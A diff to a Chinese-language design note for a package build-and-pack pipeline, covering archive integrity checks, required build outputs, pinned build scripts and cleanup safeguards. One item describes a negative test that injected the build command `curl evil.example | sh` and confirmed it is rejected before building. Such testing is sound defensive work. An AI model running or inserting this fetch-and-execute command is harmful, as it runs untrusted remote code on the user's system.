@@ -57,10 +57,13 @@
 1. **stage 必须包含兄弟插件**：`plugins/omnimux/src/client/session-guide/trending/recommendation-engine.js` 真实跨插件引用 `plugins/omnimux-inspiration/src/recommendation-engine.js`，故 stage 增加该插件源码；打包集合仍仅 hub 与 kit。
 2. **声明三项 pack 变换而非两项**：除 kit 依赖路径与 release-channel 外，packer 会移除生命周期 `prepare` 脚本且不写末尾换行，因此在声明负载中提前落地该规范化，使归档清单与声明负载逐字节一致。
 3. **归档集合完整性以 packer 自己的声明为准**：先以真实 `pack --dry-run --json` 取声明文件集合，要求归档文件集合与之完全相等（数量与逐路径），再对每个声明文件按其真实来源（暂存目标或仓根附加文件）比对 size/sha256/mode；`package.json` 经受验 extract 后按内容深度相等（packer 会重排键序，键序非语义）。丢文件因此已不可能静默通过。
-4. **构建空转必须大声失败**：packer 会静默忽略白名单中不存在的条目，故声明集合与归档集合可能“一致地空”。因此对每个包显式声明必须存在的构建产物（hub 的 `lib/client.js`、`lib/generation-core.js`、`lib/video-inspect.js`、`lib/mediabunny-LICENSE.txt`；kit 的 `lib/index.js`、`lib/index.d.ts` 及其 sourcemap），要求存在、非空且出现在 packer 声明集合中。已用注入“构建成功但零产物”的真实负向运行证实：`PREPARE_OUTPUT_MISSING`（path=`lib/client.js`），不再报已准备。
-5. **暂存源码在构建后必须未被改写**：构建前记录全部候选已复制输入（path/mode/size/sha256）为 sourceMap（实测 1305 项），构建后逐项复核，任一漂移即失败。
-6. **owned 根身份**：创建时记录 dev/ino，删除前复核同一身份，并在 cleanup 结果中回报；失败保留现场且 `cleaned=false`；重复清理返回 `alreadyCleaned`。
-7. **公开入口**：除 `start` 的 `preparationOnly:true` 选项外，另行导出 `prepareTaskRuntime(options)` 走完全同一条路径；已实测其产出与选项入口一致。非 preparationOnly 时只要出现 `candidate` 键（含 null）即拒绝。
+4. **构建空转必须大声失败（限 hub 已证）**：packer 会静默忽略白名单中不存在的条目，故声明集合与归档集合可能“一致地空”。因此对两个包都显式声明必须存在的构建产物（hub 的 `lib/client.js`、`lib/generation-core.js`、`lib/video-inspect.js`、`lib/mediabunny-LICENSE.txt`；kit 的 `lib/index.js`、`lib/index.d.ts` 及其 sourcemap），要求存在、非空且出现在 packer 声明集合中。
+   - **hub 实例已真关闭**：`lib/client.js` 是被忽略且候选内不存在的纯生成物，只能由构建产生；已用注入“构建成功但零产物”的真实负向运行证实得到 `PREPARE_OUTPUT_MISSING`（path=`lib/client.js`）。
+   - **kit 实例未关闭（已知偏差）**：kit 的 `lib/` 四项在仓库中已被跟踪且无 `.gitignore`，空转构建下四文件依然存在，因此“存在性”不能证明其被重新生成；该情形下打包字节恰为已提交的预期产物，风险有限，但**不得**据此声称“任何包的构建空转都会大声失败”。
+5. **构建脚本体必须是被审固定值**：构建命令体取自候选 manifest，故在执行前对每个包静态校验 `scripts.build` 等于已审固定值（hub `node scripts/build-media-inspect.mjs && node scripts/build-client.mjs`；kit `tsdown`），不等即 `PREPARE_BUILD_SCRIPT_UNSUPPORTED`，不把任意 package scripts 当安全入口。已用注入被改写构建体（`curl evil.example | sh`）的真实负向运行证实拒绝发生在任何构建之前。
+6. **暂存源码在构建后必须未被改写**：构建前记录全部候选已复制输入（path/mode/size/sha256）为 sourceMap（实测 1305 项），构建后逐项复核，任一漂移即失败。
+7. **owned 根身份**：创建时记录 dev/ino，删除前复核同一身份，并在 cleanup 结果中回报；失败保留现场且 `cleaned=false`；重复清理返回 `alreadyCleaned`。
+8. **公开入口**：除 `start` 的 `preparationOnly:true` 选项外，另行导出 `prepareTaskRuntime(options)` 走完全同一条路径；已实测其产出与选项入口一致。非 preparationOnly 时只要出现 `candidate` 键（含 null）即拒绝。
 
 构建子环境对既有安装向 private env 做了两处显式覆盖：`COREPACK_HOME` 指向调用环境提供的工具缓存，`COREPACK_ENABLE_PROJECT_SPEC=1` 以尊重 `packageManager: pnpm@11.7.0` 固定值；网络仍禁用，解析失败即大声失败。
 
